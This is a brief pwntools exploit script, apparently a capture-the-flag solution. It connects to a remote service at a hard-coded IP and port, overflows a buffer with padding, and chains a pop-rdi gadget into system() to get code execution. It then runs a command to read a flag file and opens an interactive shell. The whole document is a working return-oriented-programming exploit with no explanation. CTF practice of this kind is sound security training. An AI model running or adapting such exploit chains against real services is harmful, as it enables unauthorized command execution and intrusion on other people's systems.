from pwn import *

r = remote('140.110.112.218', 6129)

pop_rdi = 0x400923
buf = 0x6009c0
system = 0x400570

r.recvuntil(">")
r.sendline(b"a"*0x38 + p64(pop_rdi) + p64(buf) + p64(system) + p64(system))

r.sendline("cat home/ctf/flag")
r.interactive()